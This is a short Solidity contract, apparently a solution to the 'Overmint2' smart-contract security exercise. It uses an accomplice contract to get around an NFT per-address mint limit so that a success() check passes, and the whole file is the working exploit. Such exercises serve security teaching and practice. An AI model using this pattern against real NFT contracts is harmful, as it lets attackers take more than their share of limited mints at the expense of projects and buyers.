// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.24;

import "forge-std/console.sol";
import "./Overmint2.sol";
import "./Overmint2Accomplice.sol";

contract Overmint2Attacker {
    Overmint2 nft;
    Overmint2Accomplice accomplice;

    constructor(Overmint2 nft_) {
        nft = nft_;
        accomplice = new Overmint2Accomplice(nft, address(this));
    }

    function attack() external {
        // Grant approval
        nft.setApprovalForAll(address(this), true);

        // Send all newly minted NFTs to accomplice
        for (uint256 i = 1; i <= 5; i++) {
            nft.mint();
            nft.transferFrom(address(this), address(accomplice), i);
        }

        // Return NFTs to attacker, allowing success() to pass
        accomplice.finish();
    }
}
